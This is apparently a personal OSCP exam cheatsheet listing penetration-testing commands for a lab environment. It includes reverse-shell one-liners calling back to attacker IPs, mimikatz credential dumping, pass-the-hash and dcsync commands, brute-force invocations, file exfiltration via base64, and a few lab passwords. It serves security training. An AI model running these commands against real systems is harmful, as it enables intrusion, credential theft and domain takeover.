# OSCP exam cheatsheet (summary from my notes)
_Eliot Roxbergh for my OSCP exam 2024-02, I have yet to upload my complete notes but here is the summary I used for the exam._ \
_My relevant scripts are located here: [./OSCP_scripts](OSCP_scripts). They may be a bit ugly._

Search "**tldr**" for some checklists below. \
TIP: see "**main tldr**" and "**linux tldr**" and "**ad tldr**" below.


## Intro (start)

Note: Save info for later. Clearly note usernames, passwords and related information.

Note: Finish each step before going too far into rabbit holes. We will need multiple sets of credentials and other details to get domain admin.


### Initial access

- Some initial things to remember:
```
Remember to:
- Also do nmap UDP scan (-sU)
- For all unknown ports or not 100% confirmed ports, search e.g.: "port 1978 exploits"
- Gobuster on HTTP(S) sites
- Try anonymous / guest logins, try some default accounts. Bruteforce all possible username clues found (unlikely to match).

Extras:
Can (sometimes) search exploits by port if service not known: https://www.exploit-db.com/
Be careful to search any title and service discovered. For HTTP check the code quickly.
```

- Port scan to detect services and versions. \
Note if service versions indicates OS versions.


Note: **rustscan** is much faster than nmap
```
# rustscan is faster than nmap
rustscan -a ms01
```


```bash
# Remember to also check UDP ports with nmap -sU (UDP scan is quite slow)
# Can be combined with TCP variant -sS to do both.
sudo nmap -sU -sS -T4 -v 192.168.236.145 #udp+tcp scan, top 1k ports

```

```bash
# Hosts confirmed online (ping only)
nmap -sn 192.168.214.1/24 -oN nmap/all-hosts_ping.txt
# Port scan all (slow but maybe host doesn't answer ping)
nmap -Pn --top-ports=20 192.168.214.1/24 -oN nmap/all-hosts_scan.txt

# Thorough scan on host(s) we found online
# Note: very slow, search less ports?
nmap -Pn -p- -A 192.168.214.120-130 -oN nmap/host_scan_thorough.txt
```

- Basic enumeration: check low-hanging fruit (HTTP, SMB, ..)

- Check service versions and look for exploits with searchsploit (do this somewhat quickly and return later). Note: this can be done more exactly depending on the service, we will just start with the nmap result.


### Web (initial access)

Note: some services might use a hostname for resolving resources, set in /etc/hosts

Tip: use THEM IN THE ORDER LISTED HERE

- Start busting in the background

**Feroxbuster**

```bash
THE_HOST='http://ms01.oscp.exam'
# UPDATE: feroxbuster is amazing!
feroxbuster --url "$THE_HOST"
# This list is usually good
# /usr/share/wordlists/dirb/common.txt /usr/share/wordlists/dirb/big.txt /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt /usr/share/wordlists/wfuzz/general/megabeast.txt
feroxbuster -w ~/tmp/eliots_list.txt -u "$THE_HOST"
# IDK I made a second list WIP
# /usr/share/seclists/Discovery/Web-Content/common.txt /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
feroxbuster -w ~/tmp/eliots_list_2.txt -u "$THE_HOST"

# Some extras
./dirsearch.py -u "$THE_HOST"
# Note: Little noisy
feroxbuster dir -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u "$THE_HOST"
```

```bash
# Feroxbuster
# Discord friend suggests:
# Add suffixes: -x php aspx
# More concurrent threads: --thread 400
# Use your own wordlist: -w <wordlist>
feroxbuster -w ~/tmp/eliots_list.txt -u "$THE_HOST"
```

Gobuster (old)
```bash
# Add 4 versions of common.txt and then add sorted (sadly) and unique lines from recommended big lists
awk '{print $0 "\n" $0 ".pdf\n" $0 ".txt\n" $0 ".config"}' /usr/share/wordlists/dirb/common.txt > ~/tmp/eliots_list.txt
cat /usr/share/wordlists/dirb/big.txt /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt /usr/share/wordlists/wfuzz/general/megabeast.txt | sort | uniq >> ~/tmp/eliots_list.txt

# Eliot1 (this usually works)
# NOTE!! If a specific URI returns 403 -> this could be a hint to dig deeper just there!
gobuster dir -w ~/tmp/eliots_list.txt -u 192.168.214.16
```

```bash
# Eliot2 (WIP)
awk '{print $0 "\n" $0 ".pdf\n" $0 ".txt\n" $0 ".config"}' /usr/share/seclists/Discovery/Web-Content/common.txt > ~/tmp/eliots_list_2.txt
cat  /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt  >> ~/tmp/eliots_list_2.txt
gobuster dir -w ~/tmp/eliots_list_2.txt -u 192.168.214.16
```

```bash
#11k
#https://github.com/maurosoria/dirsearch
python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u 192.168.245.153

# Some CGI hacks, but a lot of output
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u "$THE_HOST"

# Use -x to add suffix(es) for each line
gobuster dir -w /usr/share/wordlists/dirb/common.txt -x pdf,txt,config -u 192.168.214.16

# For more see:
#	/usr/share/seclists/Discovery/Web-Content
```

- Look at source code

- Service detection

```bash
whatweb http://192.168.50.244
# Aggressive scan (more requests, slower)
whatweb -a3 http://192.168.50.244

# if Wordpress find vulns (then exploit with searchsploit)
wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan

searchsploit plugin123
# Inspect
searchsploit -x 50420
# Copy
searchsploit -m 50420
```

#### Windows (inital access)

NOTE/TODO/OPTIONAL: try adPEAS, I heard it was ok on exam?

- Gain initial access

Tip: use my simple script to try all kinds of authentication methods! --> `ad.sh`

Try creds with `crackmapexec smb` (if successful, also list shares with `--shares`), etc.!

NOTE: smb shares can be nice, but usually ignore all default shares and shares ending in $

`proxychains crackmapexec smb 172.16.207.82 -u $(<"users.txt") -p "Mushroom\!"  -d "MEDTECH.COM" --continue-on-success`


Use known creds for phishing (see [phishing](exploitation/phishing)) if access to email server or file share (e.g.): Office micros (check Minitrue) or Windows Library files.

- Quick tips: initial enumeration
```bash
# SMB
crackmapexec smb ips.txt
# Guest accounts
crackmapexec smb ips.txt -u 'guest' -p '' --shares
crackmapexec smb ips.txt -u '' -p '' --shares
```

### Priv Esc. (PE)

#### linux (PE)

Enumerate with LinPEAS, write down ideas. Non-standard paths or services? Vulnerable services, sudo, ..?

Passwords can be looked for in bashrc/profile, history, Git commits. Hopefully this is already found by LinPEAS though!

Note: If have sudo on binary see: [GTFOBins](https://gtfobins.github.io/)

Note: If we gain root or other access, enumerate again


#### Windows (PE)

- Local priv esc

NOTE: probably just use GodPotato! (these needs ImpersonatePrivilege)
```powershell
# Test it
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
# Reverse shell as SYSTEM
.\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.186 4444"
```

If Impersonate is enabled and printspooler running, you can use PrintSpoofer
```powershell
whoami /priv
get-service -name  spooler
```

WinPEAS and seatbelt.exe (if no AV is used we can run powerful shells such as meterpreter, or whatever tool we like: mimikatz). \
Pay attention to: priv esc, other users (admins?), accessible networks, password manager or keys. Is domain user? Kerberos? \
Check for sensitive files. Print all environment vars `gci env:`

- If admin \
 Enumerate system files. \
 Check PS logs. \
 Check environment variables, running scrips, earlier run scripts, open connections, network routes. \
 Use mimikatz to extract hashes and PASSWORDS. Try also to get tickets ("pass the ticket"). \
 Get usernames: Import-module PowerView.ps1 and then run `Get-NetUser | select cn,pwdlastset,lastlogon` \
	try known passwords (pw reuse) or bruteforce (note password lockout rules)

 - AD
If domain connected.

Enumerate:

PowerView.ps1

and/or

**Bloodhound** \
try Bloodhound (here we use 4.X as 5.X is not so good as of yet according to collegue 2023-12) \
	(-> then focus on high-value targets) \
 -> THAT IS, run Sharphound on target and transfer result .zip to Kali and run Bloodhound \
NOTE: Use **Sharphound 1.1.1** for the "old" bloodhound in Kali (not Community Edition)

```
# List all computers
MATCH (m:Computer) RETURN m
# List all users
MATCH (m:User) RETURN m

# Check for instance
# Owned users local admin
# Find all Domain Admins
- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers where Domain Users are Local Admin
- Shortest Path to Domain Admins from Owned Principals

- All kerberoastable users # (ignore KRBTGT account) (note SPN)

# Active sessions (if we're able to compromise that machine) (TODO didnt show anything for me)
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```



Use different methods of authentication attacks: \
Use pw/ntlm hash.. -> attack \
Create and use tickets.. -> attack

- Use tunneling to access internal networks

For chisel see tunneling, but just use ligolo instead. It can use either SOCKS proxy or TCP tunnel, the latter is easier.\
See <https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5>

Ligolo-ng to seamless reach internal network (no proxychains/socks)

(When available use e.g. evil-winrm to upload files even over tunnel.)

Ligolo-ng, TCP tunnel:
```bash
# Kali listener (=proxy)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
~/tmp/ligolo_proxy_linux  -selfcert

# Victim (Windows) (=agent)
iwr -uri 192.168.45.248/ligolo_agent_win64.exe -out ligolo_agent_win64.exe
.\ligolo_agent_win64.exe -connect 192.168.45.248:11601 -ignore-cert

# Kali listener (=proxy)
# (IN LIGOLO PROGRAM)
# select active agent
session
# list interfaces (note we can also access 127.0.0.1 if we'd need to)
ifconfig
# start tunnel
tunnel_start

# Kali shell (THIS IS NECESSARY)
#		note correct subnet
sudo ip route add 10.10.133.0/24 dev ligolo
```

Create 1-1 mapping (e.g. create rev shell from internal to :1234)
```bash
# Create port binding (internal host -> agent srv :1234 -> Kali :4321)
# Simply access Kali from internal by INTERMEDIARY_HOST_INTERNAL_IP:1234

# EXAMPLE
# Create a listener for rev shell
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
# Create a listener for HTTP
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80 --tcp
```


## Q&A / FAQ

### Web

**NOTE: if multiple web ports, they might run as different users. Try pwn all**

**Did you remember to set /etc/hosts to e.g. `ms01.oscp.exam`?**

**Did you double check all ports that were reported as HTTP by nmap?**

- **My web shell is blocked** (webshell) \
If some formats are blocked see more formats: <https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx>.

Examples used in labs so far:
```
/home/kali/tmp/staged.pHP
/home/kali/tmp/simple-backdoor.php
/home/kali/tmp/cmdasp.aspx
```

- **Burp (community edition) is throttled for bruteforce use:** \
hydra or fuff. TODO try this
```bash
# Note: update field names for user and pass
# Note: update ":Invalid" to what page shows after failed login (and NOT on success)
#		or similarly match instead on what shows on success, such as ":S=logout"
#
# -v verbose, -V show login attempts, -f stop on success
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -vV -f
```


### Linux

- **Short PE checklist to get started (linux tldr)**

```bash
# Sudo
# Note: NOPASSWD means no pw required
sudo -l
# Check running processes/cronjobs/..
#https://github.com/DominicBreuker/pspy
./pspy64
# Overview
linPEAS
# Users
cat /etc/passwd | grep -v nologin
# Some quick check for old sw (exploits)
sudo -V; cat /etc/issue/; uname -a
# Drives
lsblk; df -h; mount

## More ##
# Network
sudo netstat -tulnp
sudo ss -tulnp
# Processes
ps aux
# Check logs
journalctl | tail
ls -la /var/log

# Check all writeable files (compare especially with pspy output, or cronjobs etc.)
# Search all but ignore /sys/ /proc/
find / -type f -writable -not -path "/sys/*" -not -path "/proc/*" 2>/dev/null
# find /etc/ /usr/ /opt/ /root/ /home/ -type f -writable 2>/dev/null

# Check all suid binaries (-ls to check owner/write permissions)
find / -perm -4000 -ls 2>/dev/null
# - Tips:
# 1. Note odd binaries or specific versions
# 2. Compare with LinPEAS exploit suggestions
# 3. Try exploits: if gcc is NOT installed (and old OS) .c exploits take a sec to cross-compile (needed on OS version mismatch)
#		See script ../scripts/docker_build.sh
```

- **How to see which process is using port?**
```bash
# See sockets / ports (-p to list program)
sudo netstat -tulnp
sudo ss -tulnp
# (on Windows its netstat -ano)

# List process using port (5432)
sudo lsof -i :5432
```

### Overview Windows (windows tldr)

- **Some overview steps** (TODO old / superfluous)

```
1. Try multiple initial compromise if stuck
        - Put a bruteforce job in the background
        - Start to do manual stuff
        -> NOTE we want target to be dual-homed
2. Then try to get DA / more AD rights
        - If no lockout on service just bruteforce max in background (secondarily try own password rules if known/guessable)
        - not domain-joined:
                - try priv esc to dump creds
                - look for files/services/.. or just pivot
        - if in domain:
                - priv esc. to dump creds
                - look for password reuse
                - look at AD attacks, but usually we need local admin / some hashes / try to bruteforce kerberos acc / etc.
        - Note: some machines have dependency, move laterally but remember what you did to try again later.

On all targets look for files - so far the simple oneliner has been enough.
Check services and especially open sockets to other targets with netstat.
Some other easy things: environment variables, shell history, check logs
```


- **Overview Windows AD (ad tldr)** \


TIP: Use ldapnomnom to check whether user exists in domain, before bruteforcing (IF WE CAN REACH LDAP)
```bash
# ldapnomnom - ldap user enum w/o creds <https://github.com/lkarlslund/ldapnomnom>
#
# Determine if known users is in domain (otherwise probably local accounts)
ldapnomnom --input ~/tmp/task_oscp-c/users.md --server dc01 --parallel 16
#
# Bruteforce all usernames to find possible accounts to password bruteforce later
# Note: this blind bruteforcing takes like 6h and crashed my ligolo tunnel
ldapnomnom --input ~/tmp/10m_usernames.txt --output results.txt --server dc01 --parallel 16
tail -f results.txt
```

AD techniques
```
0. Have some credentials (pw/hash)
- Password reuse spraying: run queries for each service, including but not limited to the below methods (also ssh, ftp, websites, smb, ..)
	SMB/winrm remember to also try `--local-auth`. Check if user exists in domain with ldapnomnom, otherwise try those creds only on local.
- wmi (target is admin)
- winrm (target is admin or remote management)
- psexec/smbexec (ADMIN$ open and file sharing on)
- Then ofc other services: RDP, SSH, (sql, imap/smtp, snmp, websites, ..)
TODO does these matter where we connect from? Why if so? Kali -> random host -> internal network

1. Can reach DC?
- Use AS-REP roasting - do not need credentials but easier with - and crack user hashes (note this is per-user setting so might get zero, one, or multiple users)

2. Can reach DC + creds to a domain user
- Enumerate users via LDAP: `proxychains -q crackmapexec smb 172.16.111.6  -u jim -p Castello1!  --users`
- [remember AS-REP roasting above] (accepts hash or pw)
- Kerberoasting: ask for hashes for services (SPN) and then try to crack them (the hash is otherwise worthless to us)
	^TODO so I assume that it's enough to just run it for one user since everyone should access the service as a user?

3. Are admin on local machine
- Crack NTLM hashes
- (DCOM: with local admin you can access DCOM ports on target, but if domain-joined it authenticates towards domain too??) (TODO?) (DCOM uses msrpc :135)

4. Are admin on domain-joined host (or similar)
- [see above points 'local machine']
- DCOM (_usually_ requires admin): move laterally to other Windows hosts (TODO?)
- NTLM hashes: Pass-the-Hash (PtH). If kerberos auth is required (TODO?) use "Overpass the Hash" to convert from NTLM hash.
- Silver ticket: have a service's (SPN) NTLM hash (and machine is pre october 2022)
- Golden ticket: have krbtgt NTLM hash (or Domain Admin `whoami /groups | sls Domain`)

5. Are DA
Gain more credentials by:
- dcsync (if not DA can also be in Enterprise Admins, and Administrators or "similar")
- Shadow copies
```

- Find interesting files on compromised machines
```bash
USER=""
PASS=""
# Print all flags
crackmapexec smb ips.txt -u "$USER" -p "$PASS" -X 'gci -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue  -Force | type'
# List all files in C:\Users
crackmapexec smb ips.txt -u "$USER" -p "$PASS" -X 'gci -Path C:\Users -Include * -File -Recurse -ErrorAction SilentlyContinue -Force'
# List all files in recycle bin (idk how to actually read contents)
crackmapexec smb ips.txt -u "$USER" -p "$PASS" -X '$shell = New-Object -ComObject Shell.Application; $recycleBin = $shell.Namespace(0xA); foreach ($item in $recycleBin.Items()) { Write-Output $($item.Name) }'
```


### Windows

- **Common ports**
```bash
# Common Windows ports
nmap -Pn -n --open -p 22,25,111,139,161,445,3389,5985,5986,47001,80,443,8000,8080,8443,2222 172.16.194.10
# Scan all (quick TCP first)
sudo echo; nmap -Pn -p- -T4 ms01 && sudo nmap -sU -T4 -A ms01 && nmap -Pn -A -p- ms01

# 21 ftp
# 22 ssh (& 2222)
# 111 nfs (file server)
# 135 msrpc (try: impacket-rpcdump and rpcclient -U "")
# 139 netbios (smb)
# [UDP!] 161 snmp (network management) (try: snmpwalk)
# 389 ldap (636)
# 445 smb
# 3389 rdp
# 5985 winrm (& 5986)
# 47001 winrm
# 80, 443, 8080, 8443 Web

# 25 smtp (& 587)
# 110 pop3
# 143 imap

# Quick notes:
# winrm: 5985, (5986), 47001
# smb: 445, 139
# rdp: 3389
# psexec and others use smb??
# email: 25 587 smtp, 110 pop3, 143 imap
```


- **Rev shell example (tunneling, priv esc)**
```bash
## REV SHELL ##
# Example rev shell
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o met.exe
nc -nvlp 443

# target
iwr -uri http://192.168.45.168/met.exe -outfile C:\users\public\met.exe
C:\users\public\met.exe
# (got rev shell)

## TUNNELING ##
# Create tunnel towards internal network
~/tmp/chisel server --port 8080 --reverse

# target
iwr -uri http://192.168.45.168/chisel.exe -outfile C:\users\public\chisel.exe
C:\users\public\chisel.exe client 192.168.45.168:8080 R:socks

# Verify SOCKS works (everything should work now)
#proxychains nmap -n -Pn 172.16.193.11

## PRIV ESC ##
# Priv esc to new rev shell (using Impersonate /w PrinterSpooler). UPDATE: just use GodPotato
iwr -uri http://192.168.45.174/PrintSpoofer64.exe -outfile  c:/users/public/PrintSpoofer64.exe
iwr -uri http://192.168.45.174/nc64.exe -outfile  c:/users/public/nc64.exe
c:/users/public/PrintSpoofer64.exe -c "c:/users/public/nc64.exe 192.168.45.174 4444 -e powershell.exe"
```

- **How to authenticate with pw or hash?** \

If we are local admin, check which services are running and run appropriate method to get shell!

Note: See quick script **../scripts/ad.sh** for password and hash examples (where this is taken from) \
Comment: $DOMAIN is optional?

```bash
# PASSWORD
evil-winrm -i $IP -u "$USER" -p "$PASS"
impacket-smbexec "$DOMAIN/$USER:$PASS"@"$IP"
impacket-wmiexec "$DOMAIN/$USER:$PASS"@"$IP"
impacket-psexec "$DOMAIN/$USER:$PASS"@$IP
xfreerdp /u:"$USER" /p:"$PASS"  /v:$IP /cert:ignore # /auto-reconnect
hydra -l "$USER" -p "$PASS" $IP -t 4 ssh -V
#ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" "$USER"@$IP
```
```bash
# HASH
crackmapexec smb $IP -u "$USER" -H "$HASH" -d "$DOMAIN"  --continue-on-success
impacket-smbexec --hashes=:"$HASH" "$DOMAIN/$USER"@"$IP"
evil-winrm -i $IP -u "$USER" -H "$HASH"
impacket-wmiexec -hashes :"$HASH" "$DOMAIN/$USER"@"$IP"
impacket-psexec -hashes :"$HASH" "$DOMAIN/$USER"@$IP
impacket-dcomexec -hashes :"$HASH" "$DOMAIN/$USER"@$IP
xfreerdp /u:"$USER" /pth:"$HASH" /v:$IP /cert:ignore # /auto-reconnect
```

- **How to crack hashes?** \
Hashes can often be used in pass-the-hash attacks, regardless you should try to crack them.
If you don't know exactly how the passwords look, use a standard list. If not found maybe ignore.
```bash
hashcat -m MODE-HERE hashes.txt  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

- **How to list files? (Get-ChildItem = gci)** (gci all)
```powershell
NOTE! for CMD you can also do:
#dir /a
where /r C:\ *something

# NOTE: run seatbelt.exe and maybe winPEAS to double check
# C:\Users
gci -Path C:\Users -Include *.kdbx,*.ppk,ssh*key,*id_*sa*,*.pub,*authorized_keys*,*.txt,*.ini,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ovpn,*.zip,*.ps1 -File -Recurse -ErrorAction SilentlyContinue -Force
gci -Path C:\Users -Include *.kdbx,*.ppk,ssh*key,*id_*sa*,*.pub,*authorized_keys*,*.txt,*password*,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ovpn,*.zip,*.ps1 -File -Recurse -ErrorAction SilentlyContinue -Force
gci -Path C:\Users -Include * -File -Recurse -ErrorAction SilentlyContinue -Force
# C:\
gci -Path C:\ -Include SYSTEM,SAM,security.save,*.kdbx,*.ppk,ssh*key,*id_*sa*,*.pub,*authorized_keys*,*.ovpn -File -Recurse -ErrorAction SilentlyContinue -Force
# Print all flags
gci -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue  -Force | type
# Print all flags on all machines that we can access
crackmapexec smb ips.txt -u Administrator -p 'vau!XCKjNQBv2$' -X 'gci -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue  -Force | type'

## More ##
# List all files in recycle bin (idk how to actually read contents)
$shell = New-Object -ComObject Shell.Application; $recycleBin = $shell.Namespace(0xA); foreach ($item in $recycleBin.Items()) { Write-Output "Item: $($item.Name)" }
# List MSSQL databases (not sure if useful)
gci -Path C:\ -Include *.mdf -File -Recurse -ErrorAction SilentlyContinue -Force

## Autologon ##
# List autologon and other unattended stuff (TODO this hasnt shown anything for me)
gci -Path C:\ -Include *sysprep.inf,*sysprep.xml,*unattended.xml,*unattend.xml,*unattend.txt  -File -Recurse -ErrorAction SilentlyContinue -Force
# List registry entry for winlogon (can show "DefaultPassword")
.\seatbelt.exe WindowsAutoLogon
# OR
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

```
Also, add `|sls` to search in found files.

- **How to transfer files?** \
Simply do Invoke-WebRequest to your Linux (`cd ~/tmp; python3 -m http.server 80`)
```powershell
cd C:/users/public
iwr -uri http://192.168.45.198/winPEASx64.exe -Outfile winPEAS.exe
```

- **How to transfer files to internal network host?** \

1. In labs internal network routes to our Kali box, so any method would work e.g. iwr
2. Use evil-winrm:
Connect with evil-winrm (see ./ad.sh) and use the upload/download command.
Otherwise, idk a bit cumbersome probably: try in two stages? For instance, via intermediate SMB share or SSH tunnel?
3. Impacket: we should be able to use psexec or wmiexec and the command `lput` (=upload) or `lget` (=download).
"Note: By default whether you upload (lput) or download (lget) a file, it'll be written in C:\Windows path." - OSCP discord
4. RDP shared folder might work
5. If no other option, copy file via base64 encoded text (example below)
6. (or just copy it in two steps via intermediary host)
7. Note if you can use, web server, ssh, or anything else available

- **I have shell on server but no way to transfer file (data exfiltration)** \

First of all are you sure? (Impacket / evil-winrm / RDP ?)
**Answer:** Copy it in text format base64

Transfer binary from Windows to Kali
```powershell
# Read binary file as bytes
$fileBytes = Get-Content -Path "C:\Users\jim\Documents\Database.kdbx" -Encoding Byte
# Convert to Base64
$base64String = [System.Convert]::ToBase64String($fileBytes)
# Output Base64 string
Write-Output $base64String

# Optional, verify both side with SHA1
certutil -hashfile "C:\Users\jim\Documents\Database.kdbx" SHA1
```


- **How to privilege escalate?** \
Mainly use PrintSpoofer (or GodPotato) if `whoami /all` shows Impersonate, otherwise need to hack a little. \
(See question below -> "I’m stuck what should I do"
1. Look in files (also ps history, environment vars). Note keys, password manager, SAM, potential passwords/hints ..
2. Automatic tasks or service - .dll or .exe - hijacking (especially for unusual services, dig a little, config files..)
3. Internal sockets 

GodPotato: <https://github.com/BeichenDream/GodPotato>

- **How to find passwords/hashes** \
Use mimikatz (if you're admin), also search local files as mentioned earlier.
```powershell
cd C:/users/public
iwr -uri http://192.168.45.198/mimikatz.exe -Outfile mimikatz.exe

## Shortcuts ##
# Useful -> Print all user+ntlm (double check nothing was missed)
./mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"   | Select-String 'ntlm' -Context 2,0 | % { $_.Context.PreContext; $_.Line }
./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit" |  Select-String 'hash ntlm' -Context 1,0 | % { $_.Context.PreContext; $_.Line }
# Get all unique NTLM hashes:
./mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit" | sls ntlm | sort | unique
./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit" | sls ntlm | sort | unique

## Compare with normal command ##
# Normal dump
./mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
# Pass the ticket
./mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# NOTE: If this failed, we can try other tools, try revert, or mimikatz ps1
# In lab I got error and NEEDED TO REVERT MACHINE: "Program 'mimikatz.exe' failed to run: Access is deniedAt line:1 char:1"
#
#dump SAM manually (if user is SYSTEM)
reg.exe save hklm\security C:\temp\security.save
reg.exe save hklm\system C:\temp\system.save
#
# Invoke-Mimikatz.ps1
# TODO: This didn't work for me so idk! Newer version?
# note: try also more dump commands I guess?
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
Invoke-Mimikatz -DumpCreds #Dump creds from memory
```

- **How to find usernames or devices** \
In addition to mimikatz, use PowerView.ps1

```powershell
cd C:/users/public
iwr -uri http://192.168.45.198/PowerView.ps1 -Outfile PowerView.ps1

Import-Module .\PowerView.ps1
# Enumerate users
Get-NetUser | select cn,pwdlastset,lastlogon
# Hostnames and IP addresses
get-domaincomputer | resolve-ipaddress
# Computers
Get-NetComputer | select operatingsystem, operatingsystemversion, dnshostname
# Shares
Find-DomainShare
```
PowerView --> <https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview>

Users could reuse passwords.

It's also possible to use SharpHound but it's a somewhat complex for a small network.

- **How to get password policy?** \

Add `--pass-pol` to `crackmapexec smb`.

TODO I didn't get it to work
```powershell
#An example said
Import-Module ActiveDirectory
Get-ADDefaultDomainPasswordPolicy
```

```powershell
Import-Module .\PowerView.ps1
(Get-DomainPolicy)."SystemAccess" #Password policy
```

- **What to do with big SMB share?** \
If it's a default share or if it ends with $ you can probably ignore it.
Perform a recursive ls and parse locally to find interesting filenames.
```bash
smbclient //192.168.224.70/C$ -U MEDTECH.COM/$(<"users.txt")%$(<"passwords.txt") -c 'recurse;ls' > tmp_share.txt
```

It is also possible to mount it locally, but IDK how to if it's on internal network
```bash
mount -t cifs -o domain=MEDTECH.COM,username=wario,password='Mushroom!',vers=2.1 //172.16.223.10/C$ share
```

- **I got DA what should I do? (Domain Admin)** \

1. Pwn all domain-joined machines using DA creds.. they should work throughout the domain
2. Try dcsync attack with secretsdump -> crack Kerberos NTLM hash or use in golden ticket attack

```bash
# Dump all users
impacket-secretsdump  MEDTECH/leon:"rabbit:)"@172.16.194.10

# OR similarily use this command
crackmapexec smb 172.16.194.10 -u leon -p "rabbit:)" -d "MEDTECH.COM" --ntds

# Crack
# Use the second hex value as hash
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:c33b5cf9fa1b1bb4894d4a6cd7c54034:::
hashcat -m 1000 c33b5cf9fa1b1bb4894d4a6cd7c54034 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule -O
```
3. Similarly we could use vshadow.exe to get all AD hashes (Shadow copies) -> [hacking escalation active directory](escalation/active-directory.md)
4. Run commands on every machine, e.g.
```bash
crackmapexec smb 172.16.194.82-83 172.16.194.10-13 -u leon -p "rabbit:)"  -d "MEDTECH.COM" -X 'gci -Path C:\Users -Include *.kdbx,*.ppk,id_*sa*,*.txt,*.ini,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ovpn -File -Recurse -ErrorAction SilentlyContinue -Force'
# TODO use sls to print both name and contents (for text files)?
crackmapexec smb 172.16.194.82-83 172.16.194.10-13 -u leon -p "rabbit:)"  -d "MEDTECH.COM" -X 'gci -Path C:\Users -Include *.kdbx,*.ppk,id_*sa*,*.txt,*.ini,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ovpn -File -Recurse -ErrorAction SilentlyContinue  -Force | type'
crackmapexec smb 172.16.194.82-83 172.16.194.10-13 -u leon -p "rabbit:)"  -d "MEDTECH.COM" -X 'netstat -ano' > netstat_pwned_machines.txt
```

```bash
# Linux
echo 'blabla' | base64 -d > keepass.kdbx
#sha1sum keepass.kdbx
```

- **I'm stuck what should I do? (Windows, but techniques also apply to Linux) (main tldr)** \

Remember: if we can reach DC try to list all users (LDAP)
		  (can then do password spraying: reuse check or bruteforce a few like top100 passwords)
```bash
proxychains -q crackmapexec smb 172.16.111.6  -u jim -p Castello1!  --users
```

**My checklist:**

External network:

1. Enumerate network again (UDP & tcp)
```bash
# UDP: mainly check SNMP. THIS INCLUDES ON LINUX
sudo nmap -sU  -p161 192.168.190.156
```
3. CHECK FOR OLD VERSIONS (start /w `nmap -A`) -> exploit (e.g. searchsploit)
```bash
# enumerate smb
sudo nmap -Pn -p139 -T4 --script "discovery and smb*" 192.168.236.145
# bonus: look for vulns
nmap -sC -sV -p- -script vuln 192.168.236.145
```
4. DETERMINE SERVICE ON PORT, for all unknown ports or not 100% confirmed ports, search e.g.: "port 1978 exploits", "port 1978 HTB" and try also nc and telnet \
5. Any open SMB shares? (try 'Guest' and known creds) \
6. AD: Consider more lateral movement techniques and AD abuses (see "ad tldr") \
7. Try general common/default passwords and bruteforce whenever possible (in example DMZ machine, "password" was used for a discovered username e.g.) \
8. Are you sure all known usernames have been included in list, could some be guessed? \
9. Based on known passwords, look for password reuse or construct a rule for cracking (MAKE SURE TO TRY ON ALL SERVICES available: ssh, rdp, smb, winrm, website, etc.) \
Try creds, some reference notes (TODO):
```bash
# SMB (look for admin access)
proxychains -q crackmapexec smb  172.16.108.5-32 -u andrea -p 'PasswordPassword_6'
# Shares (look for new shares AND look for write access shares indicating we can get shell)
proxychains -q crackmapexec smb  172.16.108.5-32 -u andrea -p 'PasswordPassword_6' --shares

# Try RDP
proxychains -q hydra -l andrea -p 'PasswordPassword_6' -M ips.txt -t 1 rdp

# web, ssh, ..
# double check psexe, wmi, winrm
# Missing anything?
```
10. Web server enum: dirbusted enough for instance

Internal (powershell):

1. Check local files more thoroughly (`gci`-commands above are usually enough though --- e.g. note C:\\windows.old for SAM & SYSTEM, unusual programs, .. --- otherwise it's harder: e.g. list writable files/dirs and compare with running or restartable services)\
2. Run winPEASx64 and seatbelt.exe, and double check
```powershell
# .\seatbelt.exe -group=all
# These e.g. showed some that winPEAS missed
